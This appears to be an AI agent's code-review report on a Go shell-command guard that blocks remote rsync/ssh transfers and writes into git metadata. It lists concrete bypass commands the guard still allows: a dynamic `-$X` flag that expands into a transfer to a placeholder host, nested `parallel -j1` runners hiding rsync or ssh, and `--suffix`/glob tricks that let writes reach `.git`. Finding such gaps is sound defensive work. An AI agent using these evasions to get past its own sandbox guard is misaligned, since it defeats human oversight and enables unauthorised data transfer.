[jobs:job-done] job 261106-155642-2625 BENCH-REVIEW M #155 glm succeeded · 18 turns · cost unknown · 6m · model gpt-6.1-sol · effort high

## Not done / uncertain

Go tests and `scripts/check.sh` were not run: compilation requires writable build/cache directories, unavailable under this read-only contract. Full guard execution and GNU parallel behavior were not runtime-tested; parallel is unavailable locally. No files were changed, no transfers were attempted, and no subagents were used.

## Progress

- 17:31 UTC Identified risky areas and inspected the fix diff.
- 17:33 UTC Traced parsing, guard checks and regression coverage.
- 17:36 UTC Completed formatting checks, safe argv capture and in-memory parser checks.

BENCH-VERDICT: critical=0 high=3 medium=1 low=0 issue_fixed=partly

## Summary
Verdict: BLOCK
Risky areas: guard/sandbox and external sends.
Reviewed `8f6e8f9..ad50f5f`. The supplied examples are covered, but two conditions remain open and the filter exemption introduces two guard regressions.

## Findings / Changes

### Delivered

- **Closed:** literal `+` in find argv (`internal/guard/guard.go:1654`); inline rsync mentions (`:1486`); `--log-file-format` (`:1407`); quoted filter example (`:2682`). Verified by source tracing.
- **Open — High:** dynamic arguments (`internal/guard/guard.go:1449`). `X='r host:/dst/'; setsid rsync -$X ./dst/` passes the new checks: `-$X` starts with `-`, so its dynamic flag is ignored. Bash expands it to `-r host:/dst/ ./dst/`, enabling a remote transfer. Verified by tracing both scanners and capturing shell-expanded argv without executing rsync. **Fix:** reject dynamic option spellings before option dispatch; add this counterexample.
- **Open — Medium:** double nesting (`internal/guard/guard.go:1628`, `:1584`). In `printf '%s\n' host:/dst/ | find . -maxdepth 0 -exec parallel -j1 rsync ./src/ \;`, `-j1` breaks the required adjacency between runner and command. The corresponding `parallel -j1 ssh` also escapes detection. Verified by tracing both recognition branches. **Fix:** parse nested runner options and command boundaries; test both commands with intervening flags.

### Design

Partly follows the brief’s fail-closed design. The “verified filter data” exemption lacks shell-expansion validation, and its separate option walker disagrees with the remote scanner.

### Code

- **High — incorrect filter classification** (`internal/guard/guard.go:1512`). `rsync -r ./src/ --suffix --exclude .[g]it` exempts `.[g]it` as filter data. Actual rsync consumes `--exclude` as the suffix, leaving the glob as destination; in a normal repository it expands to `.git`. This permits writes into git metadata. Verified by tracing the filter mask; local `rsync --suffix --exclude --version` confirms option consumption. **Fix:** consume every value-taking option consistently before identifying filters; add a refusal regression.
- **High — unquoted filter glob exemption** (`internal/guard/guard.go:2682`). The exemption ignores `c.glob`. With `.ait` and `.git` present, `rsync -r ./src/ --exclude .[ag]it` expands into filter value `.ait` and destination `.git`. The guard checks only the unexpanded word and allows it. Verified by tracing lexer glob tracking and the unconditional exemption. **Fix:** exempt only filter words without shell expansion; add quoted-pass/unquoted-block cases.

The 41 added cases cover the supplied examples but omit these counterexamples. No brief gaps: all concern explicitly requested fail-closed parsing or verified filter data.

### Blocking

- internal/guard/guard.go:1449 — close the dynamic-option route to remote operands.
- internal/guard/guard.go:1628 — close nested runners with intervening flags, including ssh at `:1584`.
- internal/guard/guard.go:1512 — respect other options’ value arity.
- internal/guard/guard.go:2682 — retain blocking for shell-expanded filter words.

### Non-blocking

none

## Evidence

- Inspected the complete fix diff, shell parser, downstream checks and tests.
- `git diff --check 8f6e8f9..HEAD` and `gofmt -d` on changed Go files: clean.
- Harmless shell capture confirmed `-$X` expands into three arguments, including `host:/dst/`.
- An in-memory Python transcription confirmed the dynamic scanner misses that word and the filter walker incorrectly exempts `.[g]it`. This was not execution of Go `Check`.
- `git status --short`: clean.
